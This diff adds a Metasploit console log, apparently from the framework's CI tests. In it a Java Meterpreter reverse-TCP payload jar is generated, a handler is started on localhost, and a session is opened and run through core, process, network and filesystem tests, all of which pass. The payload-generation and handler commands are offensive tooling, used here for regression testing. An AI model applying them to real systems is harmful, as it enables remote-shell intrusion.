@@ -1,0 +1,98 @@
+use java/meterpreter/reverse_tcp
+Stopping all jobs...
+msf6 post(test/get_env) > generate -o D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220204-2608-3vusyt.jar -f jar AutoVerifySessionTimeout=10 spawn=0 lport=6017 lhost=127.0.0.1
+msf6 payload(java/meterpreter/reverse_tcp) > [*] Writing 5265 bytes to D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220204-2608-3vusyt.jar...
+msf6 payload(java/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 16
+msf6 payload(java/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6017 
+[*] Sending stage (58075 bytes) to 127.0.0.1
+[*] Meterpreter session 17 opened (127.0.0.1:6017 -> 127.0.0.1:50166 ) at 2022-02-04 02:59:21 +0000
+use test/meterpreter
+msf6 post(test/meterpreter) > run session=17 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to /tmp
+[*] Running against session 17
+[*] Session type is meterpreter and platform is windows
+before running test: should enumerate supported core commands
+[+] should enumerate supported core commands
+before running test: should support 3 or more core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+before running test: should return its own process id
+[*] Pid: 3504
+[+] should return its own process id
+before running test: should return a list of processes
+[*] PID info: {"pid"=>3504, "ppid"=>nil, "name"=>"java.exe", "path"=>"java.exe", "session"=>nil, "user"=>"fv-az159-880\\runneradmin", "arch"=>nil}
+[+] should return a list of processes
+[*] Starting system config tests
+before running test: should return a user id
+[+] should return a user id
+before running test: should return a sysinfo Hash
+[+] should return a sysinfo Hash
+[*] Starting networking tests
+before running test: should return network interfaces
+[+] should return network interfaces
+before running test: should have an interface that matches session_host
+[+] should have an interface that matches session_host
+before running test: should return network routes
+[+] should return network routes
+[*] Starting filesystem tests
+before running test: should return the proper directory separator
+[+] should return the proper directory separator
+before running test: should return the current working directory
+[*] CWD: D:\a\metasploit-framework\metasploit-framework\tmp
+[+] should return the current working directory
+before running test: should list files in the current directory
+[+] should list files in the current directory
+before running test: should stat a directory
+[*] Current directory: "D:\\a\\metasploit-framework\\metasploit-framework\\tmp"
+[*] Stat of current directory: #<#<Class:0x000001cce9a847a8>:0x000001ccf02444b0 @stathash={"st_dev"=>0, "st_mode"=>16894, "st_nlink"=>1, "st_uid"=>65535, "st_gid"=>65535, "st_rdev"=>0, "st_ino"=>0, "st_size"=>0, "st_atime"=>1643943559, "st_mtime"=>1643943559, "st_ctime"=>1643943559}>
+[+] should stat a directory
+before running test: should create and remove a dir
+[*] Directory Name: meterpreter-test-dir-bxlfeyrw
+[*] Directory created successfully
+[*] Directory removed successfully
+[+] should create and remove a dir
+before running test: should change directories
+[*] Directory Name: meterpreter-test-dir-bxlfeyrw
+[*] Directory created successfully
+[*] Old CWD: D:\a\metasploit-framework\metasploit-framework\tmp
+[*] New CWD: D:\a\metasploit-framework\metasploit-framework\tmp\meterpreter-test-dir-bxlfeyrw
+[*] Back to old CWD: D:\a\metasploit-framework\metasploit-framework\tmp
+[*] Directory removed successfully
+[+] should change directories
+before running test: should create and remove files
+[*] File Name: meterpreter-test-bxlfeyrw
+[*] Wrote to meterpreter-test-bxlfeyrw, checking contents
+[*] Wrote test
+[+] should create and remove files
+before running test: should upload a file
+[*] Remote File Name: meterpreter-test-file-bxlfeyrw.txt
+[*] uploading
+[*] done
+[*] remote file exists? true
+[+] should upload a file
+before running test: should move files
+[*] Source File Name: meterpreter-test-bxlfeyrw
+[*] Destination File Name: meterpreter-test-bxlfeyrw-moved
+[+] should move files
+before running test: should copy files
+[*] Source File Name: meterpreter-test-bxlfeyrw
+[*] Destination File Name: meterpreter-test-bxlfeyrw-copied
+[+] should copy files
+before running test: should do md5 and sha1 of files
+[*] Remote File Name: meterpreter-test-file-bxlfeyrw.txt
+[*] uploading
+[*] done
+[*] remote file exists? true
+[*] remote md5: 24134c6583c9598a6d96f1491ffe1cf9
+[*] local md5 : 24134c6583c9598a6d96f1491ffe1cf9
+[*] remote sha: d45ddfd002d14e19d60101a9b495366295663992
+[*] local sha : d45ddfd002d14e19d60101a9b495366295663992
+[+] should do md5 and sha1 of files
+[*] Testing complete in 1.4622584
+[*] Passed: 20; Failed: 0
+[*] Cleanup: changing working directory back to D:\a\metasploit-framework\metasploit-framework
+[*] Post module execution completed
+msf6 post(test/meterpreter) > 
